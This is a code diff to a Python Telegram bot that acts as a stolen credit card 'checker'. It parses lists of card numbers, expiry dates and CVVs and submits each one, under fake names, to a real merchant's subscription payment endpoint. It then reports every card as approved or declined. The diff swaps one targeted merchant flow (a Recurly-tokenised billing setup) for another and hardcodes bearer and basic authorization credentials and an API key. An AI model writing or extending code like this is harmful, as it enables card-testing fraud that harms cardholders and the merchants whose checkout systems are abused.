@@ -9,15 +9,6 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 user_stop_flag = {}
 processing_status = {}
-user_email_counters = {}
-
-def generate_email(user_id):
-    # Initialize counter if not exists
-    if user_id not in user_email_counters:
-        user_email_counters[user_id] = 2002
-    email_num = user_email_counters[user_id]
-    user_email_counters[user_id] += 1
-    return f"peshangsalam{email_num}@gmail.com"
 
 def parse_cards(text):
     cards = []
@@ -56,93 +47,76 @@ def check_card_flow(message, cards):
     user_id = message.from_user.id
     chat_id = message.chat.id
     user_stop_flag[user_id] = False
-    
+
+    AUTHORIZATION_VALUE = ("Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InFqUzVEVkJqY3VwWnQxdzY3aGpJTiJ9."
+                           "eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9saW5rZWRpZGVudGl0aWVzIjoxLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9pc0R1cGxpY2F0ZSI6ZmFsc2UsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYX..."
+                           "fTKyo1y5PaDu3Ui0WUpnkJbUVjJ0MXuHHOgBfm5o1RkleLwxdxiWeA2yZgXFFtpUH1mWnUkViqXWw3YfOJAajDEUNosZiMG_RL1LD-u721E-ihhxeZi9v6wMDB8Mu1Hd0xauUDq1vzBLjHIg99Npk4gQ4qBhezrfswAWB_XefXKp9KfMwnp1k-RLH-f3gkWkKBOvJeIoSYysAnRRXuUBSzojxQ9y50-7Ar6AwAN7TqQjGU4QAZdHG4rZ28-Y_5Eg32ihvdsQhctwF6011gDlTd-sclKUNKtfl8iEtioGGn6GzWXDC8iYDMorD5AuIArQSrWOoWTrgYZLVGcocDrHDQ")
+
     for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
         if user_stop_flag.get(user_id):
             bot.send_message(chat_id, "⏹️ Checking stopped by user.")
             break
 
-        email = generate_email(user_id)
-        first_name = "Peshang"
-        last_name = "Salam"
-        
+        payload = {
+            "BillingInformation": {
+                "Address": "",
+                "Phone": "",
+                "State": "",
+                "Country": "US",
+                "CityName": "",
+                "Zipcode": "10080"
+            },
+            "CreditCardInformation": {
+                "CreditCardNumber": f"{cc} {mm} {yy} {cvv}",
+                "Cvv2Number": f"{cvv} ",
+                "ExpirationMonth": mm,
+                "ExpirationYear": yy[-2:]
+            },
+            "UserInformation": {
+                "Firstname": "John",
+                "Lastname": "Doe",
+                "EmailAddress": "peshangdev@gmail.com",
+                "PlanId": "19690",
+                "UserId": "",
+                "Auth0Id": ""
+            },
+            "CouponCode": "",
+            "CouponDiscount": "",
+            "PlanId": "",
+            "AffiliateCartId": "ec879e15-8ea5-4c73-8103-09af2fd7bd74",
+            "RecurlyCustomFields": {}
+        }
+
+        headers = {
+            "Content-Type": "application/json",
+            "Authorization": AUTHORIZATION_VALUE,
+            "Accept": "application/json, text/plain, */*"
+        }
+
         try:
-            # Step 1: Check user
-            check_user_url = "https://services.keepingcurrentmatters.com/api/kcmft/v1/check-user"
-            headers = {
-                "Authorization": "Basic a2NtZnRmb3JtOkxUTXR2YjZtQnlqTGRx",
-                "Content-Type": "application/json"
-            }
-            requests.post(check_user_url, json={"email": email}, headers=headers)
-
-            # Step 2: Get payment token
-            token_url = "https://api.recurly.com/js/v1/token"
-            token_data = {
-                "first_name": first_name,
-                "last_name": last_name,
-                "number": cc,
-                "month": mm,
-                "year": yy,
-                "cvv": cvv,
-                "address1": "198 White Horse Pike",
-                "city": "West Collingswood",
-                "state": "NJ",
-                "postal_code": "08107",
-                "country": "US",
-                "key": "ewr1-xjjpPJHol9bMZujW5RI1Z2",
-                "version": "4.34.0"
-            }
-            token_response = requests.post(token_url, data=token_data)
-            token_json = token_response.json()
-            
-            if 'id' not in token_json:
-                raise Exception("Failed to get payment token")
-
-            payment_token = token_json['id']
-
-            # Step 3: Setup billing
-            billing_url = "https://services.keepingcurrentmatters.com/api/kcmft/v1/industries/1/setup-billing"
-            billing_data = {
-                "first_name": first_name,
-                "last_name": last_name,
-                "email": email,
-                "payment_token": payment_token,
-                "plan_code": "expert-monthly",
-                "phone": "3144740104",
-                "allow_text": False
-            }
-            billing_response = requests.post(
-                billing_url,
-                json=billing_data,
-                headers=headers
+            response = requests.post(
+                "https://api.storied.com/api/User/subscribe",
+                json=payload,
+                headers=headers,
+                timeout=30
             )
-            response_json = billing_response.json()
-            response_text = billing_response.text
-
-            if response_json.get("success") is True and "id" in response_json:
-                status = "✅ Approved"
-            elif response_json.get("success") is False and response_json.get("message") == "Failed to create purchase":
-                status = "❌ Dead"
+            text = response.text
+            if "CHARGEFAILED" in text:
+                status = "❌ Declined"
             else:
-                status = "❓ Unknown"
+                status = "✅ Approved"
 
             bot.send_message(
                 chat_id,
                 f"Card #{idx}\n"
                 f"Number: {cc}|{mm}|{yy}|{cvv}\n"
-                f"Email: {email}\n"
                 f"Status: {status}\n"
-                f"Response:\n<code>{response_text}</code>",
+                f"Response:\n<code>{text}</code>",
                 parse_mode="HTML"
             )
 
         except Exception as e:
-            bot.send_message(
-                chat_id,
-                f"❌ Error processing card #{idx}\n"
-                f"{cc}|{mm}|{yy}|{cvv}\n"
-                f"Error: {str(e)}"
-            )
+            bot.send_message(chat_id, f"❌ Error processing card #{idx}: {str(e)}")
 
         if idx < len(cards):
             for i in range(15, 0, -1):
